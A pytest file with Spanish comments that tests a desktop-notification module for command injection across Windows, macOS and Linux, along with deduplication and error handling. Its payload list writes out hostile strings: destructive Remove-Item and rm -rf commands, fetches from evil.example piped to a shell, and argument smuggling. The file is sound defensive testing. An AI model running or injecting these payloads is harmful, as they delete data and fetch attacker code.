"""Pruebas frozen offline de la emision segura de notificaciones (Sprint 12).

Importan el codigo REAL (`src.email.notifications`) y corren sin red y sin
lanzar procesos: el unico punto de inyeccion es `subprocess.Popen` (stub que
registra argv/env) y `platform.system`. Verifican que el asunto arbitrario
viaja SIEMPRE como dato (variables de entorno o argumento tras "--") y JAMAS
se interpola en el script enviado a PowerShell u osascript, mas deduplicacion
por hash, estado persistente y fallos genericos.
"""

import base64
import json
from pathlib import Path

import pytest

from src.email import notifications
from src.email.notifications import _desktop_notify, notify_new_records

# Cargas hostiles: si alguna se interpretara como codigo/shell, la ejecucion
# real tendria efectos destructivos. Aqui solo se comprueba que viajan como
# dato intacto y que no aparecen en ningun script.
INJECTION_PAYLOADS = [
    '"; Remove-Item C:\\ -Recurse -Force; #',
    "$(Start-Process calc.exe)",
    "$(iwr http://evil.example/x).Content",
    "`nRemove-Item . -Recurse",
    '"; do shell script "curl http://evil.example | sh"; "',
    '") & (do shell script "rm -rf ~") & ("',
    "$(touch /tmp/pwned); `touch /tmp/pwned2`; |touch /tmp/pwned3",
    "--urgency=critical --icon=/tmp/evil.png",
    "linea1\nlinea2\u0000linea3",
    "asunto con \ttab y \r retorno",
]

UNICODE_PAYLOAD = "Nueva factura № 7 — €1.250 ✔ 日本語 📧 Ñoño"


class _Sink:
    """Receptor de notificaciones con firma (title, body)."""

    def __init__(self):
        self.items = []

    def __call__(self, title, body):
        self.items.append((title, body))


class _PopenStub:
    def __init__(self, error=None):
        self.calls = []
        self.error = error

    def __call__(self, argv, **kwargs):
        if self.error is not None:
            raise self.error
        self.calls.append({"argv": list(argv), "kwargs": kwargs})
        return None


@pytest.fixture
def popen_stub(monkeypatch):
    stub = _PopenStub()
    monkeypatch.setattr(notifications.subprocess, "Popen", stub)
    return stub


def _set_platform(monkeypatch, system):
    monkeypatch.setattr(notifications.platform, "system", lambda: system)


def _decoded_windows_script(call):
    encoded = call["argv"][call["argv"].index("-EncodedCommand") + 1]
    return base64.b64decode(encoded).decode("utf-16-le")


# --- Windows: script constante + datos por entorno -----------------------


def test_windows_notify_passes_payload_as_env_not_script(popen_stub, monkeypatch):
    _set_platform(monkeypatch, "Windows")
    payload = INJECTION_PAYLOADS[0]
    assert _desktop_notify(payload, payload) == "windows"
    assert len(popen_stub.calls) == 1
    call = popen_stub.calls[0]
    argv = call["argv"]
    assert argv[0] == "powershell" and "-EncodedCommand" in argv
    assert "shell" not in call["kwargs"]
    script = _decoded_windows_script(call)
    assert script == notifications._WINDOWS_SCRIPT
    assert "EMAIL_AGENT_NOTIFY_BODY" in script and "EMAIL_AGENT_NOTIFY_TITLE" in script
    # El asunto jamas entra en el script: viaja solo por variables de entorno.
    assert payload not in script
    env = call["kwargs"]["env"]
    assert env["EMAIL_AGENT_NOTIFY_TITLE"] == payload
    assert env["EMAIL_AGENT_NOTIFY_BODY"] == payload


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_windows_injection_payloads_never_reach_script(popen_stub, monkeypatch, payload):
    _set_platform(monkeypatch, "Windows")
    _desktop_notify(payload, payload)
    script = _decoded_windows_script(popen_stub.calls[0])
    assert payload not in script
    env = popen_stub.calls[0]["kwargs"]["env"]
    assert env["EMAIL_AGENT_NOTIFY_BODY"] == payload


# --- macOS: AppleScript constante + datos por entorno --------------------


def test_macos_notify_passes_payload_as_env_not_applescript(popen_stub, monkeypatch):
    _set_platform(monkeypatch, "Darwin")
    payload = INJECTION_PAYLOADS[4]
    assert _desktop_notify(payload, payload) == "macos"
    call = popen_stub.calls[0]
    assert call["argv"][0] == "osascript"
    assert "shell" not in call["kwargs"]
    script = call["argv"][call["argv"].index("-e") + 1]
    assert script == notifications._MACOS_SCRIPT
    assert 'system attribute "EMAIL_AGENT_NOTIFY_BODY"' in script
    assert 'system attribute "EMAIL_AGENT_NOTIFY_TITLE"' in script
    assert payload not in script
    env = call["kwargs"]["env"]
    assert env["EMAIL_AGENT_NOTIFY_TITLE"] == payload
    assert env["EMAIL_AGENT_NOTIFY_BODY"] == payload


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_macos_injection_payloads_never_reach_script(popen_stub, monkeypatch, payload):
    _set_platform(monkeypatch, "Darwin")
    _desktop_notify(payload, payload)
    call = popen_stub.calls[0]
    assert payload not in call["argv"][call["argv"].index("-e") + 1]
    assert call["kwargs"]["env"]["EMAIL_AGENT_NOTIFY_BODY"] == payload


# --- Linux: argumentos tras el separador "--" ----------------------------


def test_linux_notify_uses_arguments_after_separator(popen_stub, monkeypatch):
    _set_platform(monkeypatch, "Linux")
    payload = INJECTION_PAYLOADS[7]
    assert _desktop_notify("Email Agent", payload) == "linux"
    call = popen_stub.calls[0]
    assert call["argv"] == ["notify-send", "--", "Email Agent", payload]
    assert "shell" not in call["kwargs"]


# --- Unicode intacto en las tres plataformas -----------------------------


@pytest.mark.parametrize("system", ["Windows", "Darwin", "Linux"])
def test_unicode_payload_survives_verbatim(popen_stub, monkeypatch, system):
    _set_platform(monkeypatch, system)
    _desktop_notify(UNICODE_PAYLOAD, UNICODE_PAYLOAD)
    call = popen_stub.calls[0]
    if system == "Windows":
        script = _decoded_windows_script(call)
        assert UNICODE_PAYLOAD not in script
        assert call["kwargs"]["env"]["EMAIL_AGENT_NOTIFY_BODY"] == UNICODE_PAYLOAD
    elif system == "Darwin":
        assert UNICODE_PAYLOAD not in call["argv"][call["argv"].index("-e") + 1]
        assert call["kwargs"]["env"]["EMAIL_AGENT_NOTIFY_BODY"] == UNICODE_PAYLOAD
    else:
        assert call["argv"][-1] == UNICODE_PAYLOAD


# --- Reglas, texto y coincidencia (se mantienen) -------------------------


def _save_rule(tmp_path, name, query, enabled=True):
    notifications.save_notification_rule(str(tmp_path), name, query, enabled)


def _record(raw, subject):
    return {"raw_sha256": raw, "subject": subject, "body": "marcador", "delivered_to": []}


def test_disabled_rule_never_notifies(tmp_path):
    _save_rule(tmp_path, "off", "factura", enabled=False)
    seen = _Sink()
    assert notify_new_records(str(tmp_path), [_record("h1", "factura")], seen) == 0
    assert seen.items == []


def test_para_and_text_matching(tmp_path):
    _save_rule(tmp_path, "ventas", "para:ventas+cliente@dominio.com FACTURA")
    seen = _Sink()
    hits = [
        {"raw_sha256": "h1", "subject": "Su FACTURA digital", "body": "", "delivered_to": ["ventas+cliente@dominio.com"]},
        {"raw_sha256": "h2", "subject": "otro tema", "body": "", "delivered_to": ["ventas+cliente@dominio.com"]},
        {"raw_sha256": "h3", "subject": "FACTURA", "body": "", "delivered_to": ["otro@dominio.com"]},
    ]
    assert notify_new_records(str(tmp_path), hits, seen) == 1
    assert seen.items == [("Email Agent", "Su FACTURA digital")]


def test_invalid_notification_filters_are_rejected_before_storage(tmp_path):
    for query in ("", "   ", "para:", "tema\npara:ventas@example.test"):
        with pytest.raises(ValueError):
            notifications.save_notification_rule(str(tmp_path), "regla", query)
    assert not (Path(tmp_path) / ".email-agent" / "notification-rules.json").exists()


def test_corrupt_rule_store_is_rejected_before_notification(tmp_path):
    path = Path(tmp_path) / ".email-agent" / "notification-rules.json"
    path.parent.mkdir()
    path.write_text(json.dumps({"rules": [{"name": "ventas", "query": "para:"}]}))
    with pytest.raises(RuntimeError, match="almacen de notificaciones invalido"):
        notifications.list_notification_rules(str(tmp_path))
    with pytest.raises(RuntimeError, match="almacen de notificaciones invalido"):
        notifications.notify_new_records(str(tmp_path), [{"raw_sha256": "h1"}])
    assert not (Path(tmp_path) / ".email-agent" / "notification-state.json").exists()


def test_corrupt_notification_state_is_rejected_before_notification(tmp_path):
    notifications.save_notification_rule(str(tmp_path), "todo", "marcador")
    path = Path(tmp_path) / ".email-agent" / "notification-state.json"
    path.write_text(json.dumps({"sent": "h1"}))
    seen = _Sink()
    with pytest.raises(RuntimeError, match="almacen de notificaciones invalido"):
        notifications.notify_new_records(str(tmp_path), [_record("h2", "marcador")], seen)
    assert seen.items == []
    assert json.loads(path.read_text()) == {"sent": "h1"}


def test_subject_fallback_when_empty(tmp_path):
    _save_rule(tmp_path, "todo", "marcador")
    seen = _Sink()
    assert notify_new_records(str(tmp_path), [_record("h1", "")], seen) == 1
    assert seen.items == [("Email Agent", "Nuevo correo")]


def test_non_dict_records_and_empty_hash_are_ignored(tmp_path):
    _save_rule(tmp_path, "todo", "marcador")
    seen = _Sink()
    records = [None, "texto", 42, _record("", "sin hash")]
    assert notify_new_records(str(tmp_path), records, seen) == 0
    assert seen.items == []


# --- Deduplicacion y estado persistente ----------------------------------


def test_dedup_within_run_and_across_runs(tmp_path):
    _save_rule(tmp_path, "todo", "marcador")
    seen = _Sink()
    records = [_record("h1", "uno"), _record("h1", "uno duplicado"), _record("h2", "dos")]
    assert notify_new_records(str(tmp_path), records, seen) == 2
    assert len(seen.items) == 2

    # El estado persiste: relanzar los mismos registros no vuelve a notificar.
    seen2 = _Sink()
    assert notify_new_records(str(tmp_path), records, seen2) == 0
    assert seen2.items == []
    state = json.loads((Path(tmp_path) / ".email-agent" / "notification-state.json").read_text(encoding="utf-8"))
    assert state == {"sent": ["h1", "h2"]}

    # Un hash nuevo si notifica.
    seen3 = _Sink()
    assert notify_new_records(str(tmp_path), [_record("h3", "tres")], seen3) == 1
    assert seen3.items == [("Email Agent", "tres")]


def test_state_persists_even_without_matches(tmp_path):
    seen = _Sink()
    assert notify_new_records(str(tmp_path), [_record("h1", "sin regla")], seen) == 0
    assert seen.items == []
    state = json.loads((Path(tmp_path) / ".email-agent" / "notification-state.json").read_text(encoding="utf-8"))
    assert state == {"sent": []}


def test_state_cap_keeps_most_recent_hashes(tmp_path):
    _save_rule(tmp_path, "todo", "marcador")
    notifications._write(notifications._path(str(tmp_path), notifications._STATE), {"sent": [f"h{i}" for i in range(5000)]})
    seen = _Sink()
    assert notify_new_records(str(tmp_path), [_record("nuevo", "x")], seen) == 1
    state = json.loads((Path(tmp_path) / ".email-agent" / "notification-state.json").read_text(encoding="utf-8"))
    assert len(state["sent"]) == 5000
    assert "nuevo" in state["sent"] and "h0" not in state["sent"] and "h4999" in state["sent"]


# --- Fallos genericos -----------------------------------------------------


def test_notifier_failure_is_generic_and_does_not_mark_sent(tmp_path):
    _save_rule(tmp_path, "todo", "marcador")

    def broken(title, body):
        raise FileNotFoundError(2, "notify-send no existe")

    with pytest.raises(RuntimeError) as excinfo:
        notify_new_records(str(tmp_path), [_record("h1", "asunto secreto")], broken)
    # Mensaje generico: sin detalle del fallo ni datos del correo.
    assert str(excinfo.value) == "fallo al emitir notificaciones"
    assert "asunto secreto" not in str(excinfo.value)
    state = json.loads((Path(tmp_path) / ".email-agent" / "notification-state.json").read_text(encoding="utf-8"))
    assert state == {"sent": []}


def test_partial_failure_persist_successes_and_retries_failures(tmp_path):
    _save_rule(tmp_path, "todo", "marcador")
    records = [_record("h1", "ok"), _record("h2", "falla"), _record("h3", "ok2")]

    def flaky(title, body):
        if body == "falla":
            raise OSError("binario ausente")

    with pytest.raises(RuntimeError):
        notify_new_records(str(tmp_path), records, flaky)
    state = json.loads((Path(tmp_path) / ".email-agent" / "notification-state.json").read_text(encoding="utf-8"))
    assert state == {"sent": ["h1", "h3"]}
    # Los que fallaron no quedan marcados: el siguiente ciclo reintenta solo ellos.
    seen = _Sink()
    assert notify_new_records(str(tmp_path), [_record("h2", "falla")], seen) == 1
    assert seen.items == [("Email Agent", "falla")]


def test_missing_binary_raises_generic_runtime(monkeypatch, tmp_path):
    _save_rule(tmp_path, "todo", "marcador")
    failing = _PopenStub(error=FileNotFoundError(2, "powershell"))
    monkeypatch.setattr(notifications.subprocess, "Popen", failing)
    _set_platform(monkeypatch, "Windows")
    with pytest.raises(RuntimeError) as excinfo:
        notify_new_records(str(tmp_path), [_record("h1", "x")])
    assert str(excinfo.value) == "fallo al emitir notificaciones"


def test_state_write_failure_propagates(tmp_path, monkeypatch):
    _save_rule(tmp_path, "todo", "marcador")

    def broken_write(path, value):
        raise OSError(13, "disco lleno")

    monkeypatch.setattr(notifications, "_write", broken_write)
    with pytest.raises(OSError):
        notify_new_records(str(tmp_path), [_record("h1", "x")], lambda title, body: None)
